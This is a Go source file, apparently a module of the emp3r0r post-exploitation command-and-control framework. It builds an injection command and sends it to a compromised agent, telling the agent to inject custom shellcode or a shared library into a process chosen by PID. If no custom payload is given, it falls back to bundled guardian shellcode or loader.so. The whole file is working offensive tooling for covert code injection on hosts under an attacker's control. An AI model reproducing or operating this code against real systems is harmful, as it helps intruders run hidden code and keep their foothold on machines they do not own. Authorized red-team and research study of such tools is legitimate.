package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleInjector() {
	// target
	target := live.ActiveAgent
	if target == nil {
		logging.Errorf("Target not exist")
		return
	}
	if live.ActiveModule.Options["method"] == nil || live.ActiveModule.Options["pid"] == nil {
		logging.Errorf("One or more required options are nil")
		return
	}
	method := live.ActiveModule.Options["method"].Val

	checksum := ""
	shellcode_file := "shellcode.txt"
	so_file := "to_inject.so"

	// shellcode.txt
	pid := live.ActiveModule.Options["pid"].Val
	if method == "shellcode" && !util.IsExist(live.WWWRoot+shellcode_file) {
		logging.Warningf("Custom shellcode '%s%s' does not exist, will inject guardian shellcode", live.WWWRoot, shellcode_file)
	} else {
		checksum = crypto.SHA256SumFile(live.WWWRoot + shellcode_file)
	}

	// to_inject.so
	if method == "shared_library" && !util.IsExist(live.WWWRoot+so_file) {
		logging.Warningf("Custom library '%s%s' does not exist, will inject loader.so instead", live.WWWRoot, so_file)
	} else {
		checksum = crypto.SHA256SumFile(live.WWWRoot + so_file)
	}

	// injector cmd
	cmd := fmt.Sprintf("%s --method %s --pid %s --checksum %s", def.C2CmdInject, method, pid, checksum)

	// tell agent to inject
	err := CmdSender(cmd, "", target.Tag)
	if err != nil {
		logging.Errorf("Could not send command (%s) to agent: %v", cmd, err)
		return
	}
	logging.Printf("Please wait...")
}
